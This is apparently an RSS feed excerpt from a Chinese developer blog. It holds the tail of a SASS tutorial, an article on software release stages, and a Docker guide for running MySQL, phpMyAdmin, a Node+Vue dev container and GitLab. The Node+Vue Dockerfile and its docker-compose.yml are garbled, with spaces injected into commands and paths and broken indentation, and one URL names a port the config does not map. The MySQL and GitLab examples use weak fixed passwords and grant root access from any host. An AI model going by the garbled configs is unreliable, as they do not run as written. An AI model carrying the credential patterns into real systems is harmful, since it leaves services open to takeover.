<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>使用 <code>@include</code> 命令, 调用这个 <code>mixin</code> 。</p>
<div><pre><code><span>div </span><span>{</span>
  <span>@include</span> left<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><code>mixin</code> 的强大之处, 在于可以指定参数和缺省值。</p>
<div><pre><code><span>@mixin</span> <span>left</span><span>(</span><span><span>$value</span></span><span>:</span> 10px<span>)</span> <span>{</span>
  <span>float</span><span>:</span> left<span>;</span>
  <span>margin-right</span><span>:</span> <span>$value</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>使用的时候, 根据需要加入参数:</p>
<div><pre><code><span>div </span><span>{</span>
  <span>@include</span> <span>left</span><span>(</span>20px<span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>下面是一个 <code>mixin</code> 的实例, 用来生成浏览器前缀。</p>
<div><pre><code><span>@mixin</span> <span>rounded</span><span>(</span><span>$vert</span><span>,</span> <span>$horz</span><span>,</span> <span><span>$radius</span></span><span>:</span> 10px<span>)</span> <span>{</span>
  <span>border-<span>#{$vert}</span>-<span>#{$horz}</span>-radius</span><span>:</span> <span>$radius</span><span>;</span>
  <span>-moz-border-radius-<span>#{$vert}</span><span>#{$horz}</span></span><span>:</span> <span>$radius</span><span>;</span>
  <span>-webkit-border-<span>#{$vert}</span>-<span>#{$horz}</span>-radius</span><span>:</span> <span>$radius</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>使用的时候, 可以像下面这样调用:</p>
<div><pre><code><span>#navbar li </span><span>{</span>
  <span>@include</span> <span>rounded</span><span>(</span>top<span>,</span> left<span>)</span><span>;</span>
<span>}</span>

<span>#footer </span><span>{</span>
  <span>@include</span> <span>rounded</span><span>(</span>top<span>,</span> left<span>,</span> 5px<span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="颜色函数" tabindex="-1"> 颜色函数</h3>
<p>SASS 提供了一些内置的颜色函数, 以便生成系列颜色。</p>
<div><pre><code><span>lighten</span><span>(</span>#cc3<span>,</span> 10%<span>)</span> <span>// #d6d65c</span>
<span>darken</span><span>(</span>#cc3<span>,</span> 10%<span>)</span> <span>// #a3a329</span>
<span>grayscale</span><span>(</span>#cc3<span>)</span> <span>// #808080</span>
<span>complement</span><span>(</span>#cc3<span>)</span> <span>// #33c</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="插入文件" tabindex="-1"> 插入文件</h3>
<p><code>@import</code> 命令, 用来插入外部文件。</p>
<div><pre><code><span>@import</span> <span>"path/filename.scss"</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>如果插入的是 <code>.css</code> 文件, 则等同于 css 的 <code>import</code> 命令。</p>
<div><pre><code><span>@import</span> <span>"foo.css"</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="高级用法" tabindex="-1"> 高级用法</h2>
<h2 id="条件语句" tabindex="-1"> 条件语句</h2>
<p><code>@if</code> 可以用来判断:</p>
<div><pre><code><span>p </span><span>{</span>
  <span>@if</span> <span>1+1==2 </span><span>{</span>
    <span>border</span><span>:</span> 1px solid<span>;</span>
  <span>}</span>

  <span>@if</span> <span>5 &lt; 3 </span><span>{</span>
    <span>border</span><span>:</span> 2px dotted<span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>配套的还有 <code>@else</code> 命令:</p>
<div><pre><code><span>@if</span> <span>lightness</span><span>(</span><span>$color</span><span>)</span> <span>>30% </span><span>{</span>
  <span>background-color</span><span>:</span> #000<span>;</span>
<span>}</span> <span>@else</span> <span>{</span>
  <span>background-color</span><span>:</span> #fff<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="循环语句" tabindex="-1"> 循环语句</h3>
<p>SASS 支持 <code>for</code> 循环:</p>
<div><pre><code><span>@for</span> <span>$i</span> <span>from</span> <span>1 to 10 </span><span>{</span>
  <span>.border-<span>#{$i}</span> </span><span>{</span>
    <span>border</span><span>:</span> <span>#{$i}</span>px solid blue<span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>也支持 <code>while</code> 循环:</p>
<div><pre><code><span><span>$i</span></span><span>:</span> 6<span>;</span>

<span>@while</span> <span><span>$i</span>>0 </span><span>{</span>
  <span>.item-<span>#{$i}</span> </span><span>{</span>
    <span>width</span><span>:</span> 2em <span>*</span> <span>$i</span><span>;</span>
  <span>}</span>

  <span><span>$i</span></span><span>:</span> <span>$i</span> <span>-</span> 2<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>each</code> 命令, 作用与 <code>for</code> 类似:</p>
<div><pre><code><span>@each</span> <span><span>$member</span> in a, b, c, d </span><span>{</span>
  <span>.<span>#{$member}</span> </span><span>{</span>
    <span>background-image</span><span>:</span> <span>url</span><span>(</span><span>"/image/#{$member}.jpg"</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="自定义函数" tabindex="-1"> 自定义函数</h3>
<p>SASS 允许用户编写自市场上市己的函数。</p>
<div><pre><code><span>@function</span> <span>double</span><span>(</span><span>$n</span><span>)</span> <span>{</span>
  <span>@return</span> <span>$n</span> <span>*</span> 2<span>;</span>
<span>}</span>

<span>#sidebar </span><span>{</span>
  <span>width</span><span>:</span> <span>double</span><span>(</span>5px<span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>软件版本周期</title>
      <link>https://vxhly.github.io/views/manual/software-version-cycle.html</link>
      <guid>https://vxhly.github.io/views/manual/software-version-cycle.html</guid>
      <source url="https://vxhly.github.io/rss.xml">软件版本周期</source>
      <description>前言
软件版本周期是指计算机软件的发展及发行过程, 从 Pre-alpha（准预览版本）发展到 Alpha（预览版本）、Beta（测试版本）、Released candidate （最终测试版本）至最后的 Gold（完成版）。

</description>
      <category>manual</category>
      <pubDate>Sun, 21 Oct 2018 19:13:55 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>软件版本周期是指计算机软件的发展及发行过程, 从 Pre-alpha（准预览版本）发展到 Alpha（预览版本）、Beta（测试版本）、Released candidate （最终测试版本）至最后的 Gold（完成版）。</p>
</div>

<h2 id="一张图诠释发展软件的过程" tabindex="-1"> 一张图诠释发展软件的过程</h2>
<p><img src="/assets/software.jpg" alt="software-version"></p>
<h2 id="开发期" tabindex="-1"> 开发期</h2>
<h3 id="pre-alpha" tabindex="-1"> Pre-alpha</h3>
<p>有时候软件会在 Alpha 或 Beta 版本前先发布 Pre-alpha 版本。一般而言相对于 Alpha 或 Beta 版本, Pre-alpha 版本是一个功能不完整的版本</p>
<h3 id="alpha" tabindex="-1"> Alpha</h3>
<p>Alpha 版本仍然需要测试, 其功能亦未完善, 因为它是整个软件发布周期中的第一个阶段, 所以它的名称是&quot;Alpha&quot;, 希腊字母中的第一个字母&quot;α&quot;。</p>
<p>Alpha 版本通常会送到开发软件的组织或某群体中的软件测试者作内部测试。在市场上, 越来越多公司会邀请外部客户或合作伙伴参与其测试。这令软件在此阶段有更大的可用性测试。</p>
<p>在测试的第一个阶段中, 开发者通常会进行白盒测试。其他测试会在稍后时间由其他测试团体以黑盒或灰盒技术进行, 不过有时会同时进行。</p>
<h3 id="beta" tabindex="-1"> Beta</h3>
<p>Beta 版本是软件最早对外公开的软件版本, 由公众（通常为公司外的第三方开发者和业余玩家）参与测试。 因为是 Alpha 的下一个阶段, 所以为希腊字母的第二个字 Beta (β)。 一般来说, Beta 包含所有功能, 但可能有一些已知问题和较轻微的程序错误（BUG）, 要进行除错（debug）。Beta 版本的测试者通常是开发软件的组织的客户, 他们会以免费或优惠价钱得到软件。Beta 版本亦作为测试产品的支持和市场反应等。</p>
<p>其他情况不同企业有不同的称法, 例如微软曾以 Community Technology Preview（简称 CTP, 中文称为&quot;社群技术预览&quot;）为发布软件的测试版本之一, 微软将这个阶段的软件散布给有需要先行试用的用户或厂商, 并收集这些人的使用经验, 以便作为进一步修正软件的参考。</p>
<h3 id="release-candidate" tabindex="-1"> Release Candidate</h3>
<p>Release Candidate（简称 RC）指可能成为最终产品的候选版本, 如果未出现问题则可发布成为正式版本。在此阶段的产品通常包含所有功能、或接近完整, 亦不会出现严重问题。</p>
<p>多数开源软件会推出两个 RC 版本, 最后的 RC2 则成为正式版本。闭源软件较少公开使用, 微软公司在 Windows 7 上应用此名称。苹果公司把在这阶段的产品称为&quot;Golden Master Candidate&quot;（简称 GM Candidate）, 而最后的 GM 即成为正式版本。</p>
<h2 id="完成期" tabindex="-1"> 完成期</h2>
<h3 id="release-to-manufacting-rtm" tabindex="-1"> Release to Manufacting, RTM</h3>
<p><code>生产商发放</code> （Release to Manufacturing, 缩写 <code>RTM</code> ）是软件产品准备交付时使用的术语, 来自于以前还需要使用实体载具（光盘, 硬盘等）来进行安装的时代。某些计算机程序以&quot;RTM&quot;作为软件版本代号, 例如微软 Windows 7 发行零售版前的 RTM 版本主要是发放给组装机生产商用, 使制造商能够提早进行集成工作或解决软件与硬件设备可能遇到的错误。RTM 版本并不一定意味着创作者解决了软件所有问题；仍有可能向公众发布前更新版本。以 Windows 7 为例: RTM 版与零售版的版本号是一样的。</p>
<h3 id="general-availability-ga" tabindex="-1"> General availability, GA</h3>
<p><code>一般可用</code> （General availability, 缩写 <code>GA</code> ）是所有必要的商业活动已经完成, 该软件产品已经可以发售的阶段。然而, 这取决于语言、地域和电子设备与媒体的可用性, 有些地区之间可能会有上市时间的延迟。商业活动可能也包括安全性和合法测试, 以及本地化和全球销售的可能性评估。RTM 与 GA 的间隔可能会是 1 周或几个月, 因为在此过程中需要进行许多商业活动。在这个阶段, 可以说软件已经&quot;上线&quot;了。</p>
<h3 id="release-to-web-rtw" tabindex="-1"> Release to Web, RTW</h3>
<p><code>网络分发</code> （Release to Web, 缩写 <code>RTW</code> ）, 或称 Web 发布是一种利用互联网进行分发的软件交付方式。制造商在这种类型的发布中并不生产实体软件工具, 而会借由 OTA 来进行发放。随着互联网使用人数的增长, RTW 变得越来越普遍。</p>
<h3 id="stable" tabindex="-1"> Stable</h3>
<p><code>稳定版本</code> 来自预览版本释出使用与改善而修正完成, 通常是初始版本进行几个小更新后的版本。为目前所使用的软件在匹配需求规格的硬件与操作系统中运行不会造成严重的不兼容或是硬件冲突, 其已受过某定量的测试无误后所释出者。</p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/software.jpg" type="image/jpeg"/>
    </item>
    <item>
      <title>docker 使用指南</title>
      <link>https://vxhly.github.io/views/manual/usage-of-docker.html</link>
      <guid>https://vxhly.github.io/views/manual/usage-of-docker.html</guid>
      <source url="https://vxhly.github.io/rss.xml">docker 使用指南</source>
      <description>前言
Docker 是一个开源的应用容器引擎, 基于 Go 语言 并遵从 Apache2.0 协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中, 然后发布到任何流行的 Linux 机器上, 也可以实现虚拟化。

</description>
      <category>manual</category>
      <pubDate>Tue, 26 Mar 2019 14:41:23 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Docker 是一个开源的应用容器引擎, 基于 Go 语言 并遵从 Apache2.0 协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中, 然后发布到任何流行的 Linux 机器上, 也可以实现虚拟化。</p>
</div>

<h2 id="为什么要用-docker" tabindex="-1"> 为什么要用 Docker？</h2>
<p>在没有 docker 之前, 如果我们要在 windows 上安装 mysql、mongodb 需要先下载这些软件, 然后还要一步步点设置, 并且注册到 windows 服务。并且根本不知道安装到什么地方（某些版本 mysql 不能指定安装位置, 默认到 C 盘）。同时也会在控制面板内注册许多相关的插件。以后要卸载的时候可能还会有各种残留。作为一个强迫症患者这是万万不能忍受的。 现在有了 docker, 只需要一行代码就能拉取所需软件的镜像, 然后配置一个容器就启动了。需要开发的时候就打开 docker, 服务便能够运行。占用的空间也小, 性能和原生差异不大。增删查改都只需要一行代码就能完成。卸载起来也毫无残留。更重要的是, 我可以同时有一个镜像的几个容器。即使我搞坏了一个, 也可以用其他的容器。还能随时监测这些容器的磁盘占用等状态</p>
<h2 id="docker-文档" tabindex="-1"> docker 文档</h2>
<div><p>提示</p>
<p>这里只找到了英文的文档, 所以英文不好的慎阅 <a href="https://docs.docker.com" target="_blank" rel="noopener noreferrer">官方 docker 文档</a> <a href="https://docker_practice.gitee.io/" target="_blank" rel="noopener noreferrer">非官方 docker 整理文档</a></p>
</div>
<h2 id="常用的-docker-命令" tabindex="-1"> 常用的 docker 命令</h2>
<div><pre><code><span>docker</span> pull <span>[</span>image_name<span>]</span>:<span>[</span>version<span>]</span>  <span># 下载镜像</span>
<span>docker</span> run -it <span>[</span>docker_id<span>]</span> <span>bash</span>     <span># 运行一个容器实例</span>

<span>docker</span> <span>ps</span>             <span># 查看当前运行的 docker 容器的进程信息</span>
<span>docker-compose</span> <span>ps</span>     <span># 查看当前的使用 docker-compose up -d 开启的容器进程信息</span>
<span>docker-compose</span> up -d  <span># 使用本地的 docker-compose.yml 开启相关的容器</span>
<span>docker-compose</span> down   <span># 终止当前的使用 docker-compose up -d 开启的容器</span>
<span>docker</span> images         <span># 查看本地的所有 docker 镜像</span>
<span>docker</span> image <span>rm</span> <span>[</span>docker_image_id<span>]</span>   <span># 删除本地的 docker 镜像</span>
<span>docker</span> rmi -f <span>[</span>docker_image_id<span>]</span>     <span># 删除本地的 docker 镜像</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="在你的机子上安装服务" tabindex="-1"> 在你的机子上安装服务</h2>
<p>至于一些 docker 镜像下载加速或者其他的知识自行查阅文档, 这里只收集 docker 安装各种服务的方法</p>
<h3 id="ubuntu" tabindex="-1"> Ubuntu</h3>
<div><pre><code>$ <span>docker</span> pull ubuntu
$ <span>docker</span> run -it ubuntu <span>bash</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="mysql" tabindex="-1"> MySQL</h3>
<h4 id="通过镜像" tabindex="-1"> 通过镜像</h4>
<div><pre><code><span># 搜索mysql的镜像信息</span>
$ <span>docker</span> search mysql
<span># 从仓库拉取mysql,mysql:tag 后面可以跟标签得到指定版本,不加默认为lastest</span>
$ <span>docker</span> pull mysql

$ <span>docker</span> run --name test-mysql -p <span>3306</span>:3306 -e <span>MYSQL_ROOT_PASSWORD</span><span>=</span>root -d mysql:5.6
$ <span>docker</span> run --name test-phpmyadmin -p <span>8080</span>:80 --link test-mysql:db -d phpmyadmin/phpmyadmin:latest
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="通过-docker-compose-yml" tabindex="-1"> 通过 docker-compose.yml</h4>
<div><pre><code><span>version</span><span>:</span> <span>"2"</span>
<span>services</span><span>:</span>
  <span>mysql</span><span>:</span>
    <span>image</span><span>:</span> mysql<span>:</span><span>5.6</span>
    <span>container_name</span><span>:</span> test<span>-</span>mysql
    <span>restart</span><span>:</span> always
    <span>ports</span><span>:</span>
      <span>-</span> <span>"3306:3306"</span>

    <span>environment</span><span>:</span>
      <span>MYSQL_USER</span><span>:</span> <span>"root"</span>
      <span>MYSQL_PASSWORD</span><span>:</span> <span>"root"</span>
      <span>MYSQL_ROOT_PASSWORD</span><span>:</span> <span>"root"</span>
    <span>networks</span><span>:</span>
      <span>-</span> net<span>-</span>mysql

  <span>phpmyadmin</span><span>:</span>
    <span>image</span><span>:</span> phpmyadmin/phpmyadmin<span>:</span>latest
    <span>container_name</span><span>:</span> test<span>-</span>phpmyadmin
    <span>ports</span><span>:</span>
      <span>-</span> <span>"8080:80"</span>

    <span>environment</span><span>:</span>
      <span>MYSQL_USER</span><span>:</span> <span>"root"</span>
      <span>MYSQL_PASSWORD</span><span>:</span> <span>"root"</span>
      <span>MYSQL_ROOT_PASSWORD</span><span>:</span> <span>"root"</span>
      <span>PMA_HOST</span><span>:</span> test<span>-</span>mysql
    <span>networks</span><span>:</span>
      <span>-</span> net<span>-</span>mysql

<span>networks</span><span>:</span>
  <span>net-mysql</span><span>:</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>docker-compose.yml 同级目录下执行: <code>docker-compose up -d</code> 之后在浏览器访问 <code>http://127.0.0.1:7777</code> 即可</p>
<p>如果无法正常登录的话, 使用 <code>docker exec -it [dockerId] bash</code> 进入 MySQL 容器并登陆 MySQL 执行以下命令</p>
<div><pre><code>mysql<span>></span> grant all privileges on *.*  to <span>'root'</span>@<span>'%'</span><span>;</span>
mysql<span>></span> flush privileges<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><div><pre><code><span># Use root/p@ssw0rd as user/password credentials</span>
<span>version</span><span>:</span> <span>"3.1"</span>

<span>services</span><span>:</span>
  <span>db</span><span>:</span>
    <span>image</span><span>:</span> mysql
    <span>command</span><span>:</span> <span>-</span><span>-</span>default<span>-</span>authentication<span>-</span>plugin=mysql_native_password
    <span>restart</span><span>:</span> always
    <span>environment</span><span>:</span>
      <span>MYSQL_ROOT_PASSWORD</span><span>:</span> p@ssw0rd

  <span>adminer</span><span>:</span>
    <span>image</span><span>:</span> adminer
    <span>restart</span><span>:</span> always
    <span>ports</span><span>:</span>
      <span>-</span> 8080<span>:</span><span>8080</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="node-vue" tabindex="-1"> Node + Vue</h3>
<p>在项目文件夹下创建 <code>dockerfile</code></p>
<div><pre><code><span><span>FROM</span> node: latest</span>

<span># 设置时区</span>
<span><span>RUN</span> sh - c <span>"echo 'Asia/Shanghai' > /etc/timezone"</span> &amp;&amp; <span>\</span>
    dpkg - reconfigure - f noninteractive tzdata</span>

<span># 使用阿里云的Ubuntu镜像</span>
<span><span>RUN</span> echo <span>'\n\
deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\n\
deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\n\
deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\n\
deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\n\
deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\n\
deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\n\
deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\n\
deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\n\
deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\n\
deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\n'</span>\ ></span>
    /etc/apt / sources.list

<span><span>RUN</span> apt - get update\ &amp;&amp;</span>
    apt - get install - y\# node - sass 等编译依赖
make gcc g++build - essential python2 .7\# 命令行工具
curl wget vim git git - flow yarn xsel

<span># 切换 node 的软件版本源 => 切源工具 cgr 和 nrm</span>
<span># cgr 是基于nrm的改进版本, 进行了一些优化, 能同时管理 npm、 yarn 源# cgr use taobao n => 只是切换 npm 源# cgr use taobao y => 只是切换 yarn 源</span>
<span><span>RUN</span> true<span>\</span>
    &amp;&amp;</span>
    npm install - g cgr nrm\ &amp;&amp;
    cgr use taobao\ &amp;&amp;
    npm i - g serve @vue / cli @vue / cli - service - global\
commitizen conventional - changelog - cli eslint - plugin - vue\
npm - check - updates npx

<span># 创建工作目录</span>
<span><span>RUN</span> mkdir / workspace</span>

<span><span>WORKDIR</span> / workspace</span>

<span># 添加权限, 755 或者 a + x</span>
<span><span>RUN</span> chmod - R 755 / workspace</span>

<span><span>VOLUME</span> / workspace</span>

<span><span>EXPOSE</span> 8080</span>
<span><span>EXPOSE</span> 5000</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在项目文件夹下创建 <code>docker-compose.yml</code></p>
<div><pre><code><span>version</span><span>:</span> <span>'3'</span>
<span>services</span><span>:</span>
    <span>dev</span><span>:</span>
    <span>image</span><span>:</span> <span>vueimage</span><span>:</span> <span>1.0</span>
<span>ports</span><span>:</span>

    <span>-</span> <span>"8080:8080"</span> <span># 映射端口, 将本机的 8080 端口映射到 docker 的 8080 端口, npm run serve</span>

<span>restart</span><span>:</span> always <span># 每次开启 docker 的时候重启服务, 适用于 MySQL、 nginx 类似于这种的服务</span>
<span>volumes</span><span>:</span>

    <span>-</span> ./<span>:</span>/workspace <span># 将执行命令的目录映射到 docker 容器的 /workspace目录</span>

<span>stdin_open</span><span>:</span> <span>true</span> <span># 命令行输入映射, 不进行设置会导致无法正常进入 docker</span>
<span>tty</span><span>:</span> <span>true</span> <span># 使用TTY模式（ pseudo - TTY）。 若要使用bash, 则必须设置该选项。 若不设置该选项, 则可以输入命令, 但不显示shell</span>
<span>web</span><span>:</span>
    <span>image</span><span>:</span> vueimage<span>:</span><span>1.0</span>
<span>ports</span><span>:</span>

    <span>-</span> <span>"5000:5000"</span> <span># 映射端口, 将本机的 5000 端口映射到 docker 的 5000 端口, npm run build &amp;&amp; serve dist\</span>

<span>restart</span><span>:</span> always <span># 每次开启 docker 的时候重启服务, 适用于 MySQL、 nginx 类似于这种的服务</span>
<span>volumes</span><span>:</span>

    <span>-</span> ./<span>:</span>/workspace <span># 将执行命令的目录映射到 docker 容器的 /workspace目录</span>

<span>stdin_open</span><span>:</span> <span>true</span> <span># 命令行输入映射, 不进行设置会导致无法正常进入 docker</span>
<span>tty</span><span>:</span> <span>true</span> <span># 使用TTY模式（ pseudo - TTY）。 若要使用bash, 则必须设置该选项。 若不设置该选项, 则可以输入命令, 但不显示shell</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在项目文件夹下执行(编译一个镜像容器出来)</p>
<div><pre><code><span>docker</span> build -t vueimage:1.0 <span>.</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>编译完成之后执行, 用以启动容器</p>
<div><pre><code><span>docker-compose</span> up -d
</code></pre><div aria-hidden="true"><div></div></div></div><p>使用 <code>docker ps</code> 查看 容器的 id, 之后使用以下命令进入容器</p>
<div><pre><code><span>docker</span> <span>exec</span> -it <span>[</span>docker_id<span>]</span> <span>zsh</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>确认当前目录已经挂载了当前的项目目录, 使用 <code>pwd</code> 确认当前的目录为 <code>/workspace</code> , 执行安装依赖命令并且启动服务</p>
<div><pre><code><span>yarn</span> <span>install</span>
<span>yarn</span> serve
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>服务启动之后就在浏览器中访问 <code>http://127.0.0.1:8080</code> 经过上面的配置, 我们就可以在主机上使用喜欢的编辑器编辑代码, 通过 docker 执行。但是使用 <code>yarn serve</code> 命令进行开发时, 会发现一个问题: 在编辑器中编辑文件后, docker 无法监听到文件的修改, 从而重新编译、刷新页面；我们可以采用 webpack 的轮询功能解决:</p>
<p>关于 webpack 的轮询功能 =&gt; <a href="https://www.webpackjs.com/configuration/watch/" target="_blank" rel="noopener noreferrer">webpack</a></p>
<p><code>vue.config.js</code></p>
<div><pre><code>module<span>.</span>exports <span>=</span> <span>{</span>
  <span>devServer</span><span>:</span> <span>{</span>
    <span>watchOptions</span><span>:</span> <span>{</span>
      <span>aggregateTimeout</span><span>:</span> <span>300</span><span>,</span> <span>// 当第一个文件更改,会在重新构建前增加延迟。这个选项允许 webpack 将这段时间内进行的任何其他更改都聚合到一次重新构建里。以毫秒为单位:</span>
      <span>poll</span><span>:</span> <span>1000</span><span>,</span> <span>// 通过传递 true 开启 polling,或者指定毫秒为单位进行轮询。</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>到此已经全部配置完毕, 重新 <code>yarn serve</code> 然后就可以愉快的写代码了</p>
<h3 id="gitlab" tabindex="-1"> gitlab</h3>
<h4 id="英文官方原版" tabindex="-1"> 英文官方原版</h4>
<p>在项目文件夹下创建 <code>docker-compose.yml</code></p>
<div><pre><code><span>version</span><span>:</span> <span>"3"</span>

<span>services</span><span>:</span>
  <span>gitlab</span><span>:</span>
    <span>container_name</span><span>:</span> gitlab
    <span>image</span><span>:</span> gitlab/gitlab<span>-</span>ce
    <span>restart</span><span>:</span> always
    <span>hostname</span><span>:</span> <span>"gitlab-en"</span>
    <span>environment</span><span>:</span>
      <span>GITLAB_OMNIBUS_CONFIG</span><span>:</span> <span>|</span><span>
        # external_url 'http://gitlab.example.com:9090'</span>
    <span>ports</span><span>:</span>
      <span>-</span> <span>"80:80"</span>
      <span>-</span> <span>"443:443"</span>
      <span>-</span> <span>"2224:22"</span>

    <span>volumes</span><span>:</span>
      <span>-</span> ./en/config<span>:</span>/etc/gitlab
      <span>-</span> ./en/logs<span>:</span>/var/log/gitlab
      <span>-</span> ./en/data<span>:</span>/var/opt/gitlab
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="中文社区版" tabindex="-1"> 中文社区版</h4>
<p>在项目文件夹下创建 <code>docker-compose.yml</code></p>
<div><pre><code><span>version</span><span>:</span> <span>"3"</span>

<span>services</span><span>:</span>
  <span>gitlab-ce</span><span>:</span>
    <span>container_name</span><span>:</span> gitlab<span>-</span>ce
    <span>image</span><span>:</span> twang2218/gitlab<span>-</span>ce<span>-</span>zh
    <span>restart</span><span>:</span> always
    <span>hostname</span><span>:</span> <span>"gitlab"</span>
    <span>environment</span><span>:</span>
      <span>TZ</span><span>:</span> <span>"Asia/Shanghai"</span>
      <span>GITLAB_OMNIBUS_CONFIG</span><span>:</span> <span>|</span><span>
        # pages_external_url = "http://gitlab.demo.io/"
        gitlab_rails['time_zone'] = 'Asia/Shanghai'
        gitlab_pages['enable'] = true</span>
    <span>ports</span><span>:</span>
      <span>-</span> <span>"80:80"</span>
      <span>-</span> <span>"443:443"</span>
      <span>-</span> <span>"2224:22"</span>

    <span>volumes</span><span>:</span>
      <span>-</span> ./cn/config<span>:</span>/etc/gitlab
      <span>-</span> ./cn/logs<span>:</span>/var/log/gitlab
      <span>-</span> ./cn/data<span>:</span>/var/opt/gitlab
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="拓展" tabindex="-1"> 拓展</h3>
<h4 id="重置普通用户的密码" tabindex="-1"> 重置普通用户的密码</h4>
<p>进入容器之后执行以下命令</p>
<div><pre><code>$ gitlab-rails console production <span># 进入gitlab管理控制台</span>
irb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> <span>user</span><span>=</span>User.where<span>(</span>name: <span>"[user_name]"</span><span>)</span>.first <span># 将 [user_name] 替换成用户名</span>
irb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.password<span>=</span><span>12345678</span>
irb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.password_confirmation<span>=</span><span>12345678</span>
irb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.save<span>!</span>
irb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> quit
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="重设管理员密码" tabindex="-1"> 重设管理员密码</h4>
<p>进入容器之后执行以下命令</p>
<div><pre><code>$ gitlab-rails console production <span># 进入gitlab管理控制台</span>
irb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> <span>user</span><span>=</span>User.where<span>(</span>id: <span>1</span><span>)</span>.first <span># 将 [user_name] 替换成用户名</span>
irb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.password<span>=</span><span>12345678</span>
irb<span>(</span>main<span>)</span>:001:<span><span>0</span>></span> user.password_confirmation<span>=</span><span>12345678</span>
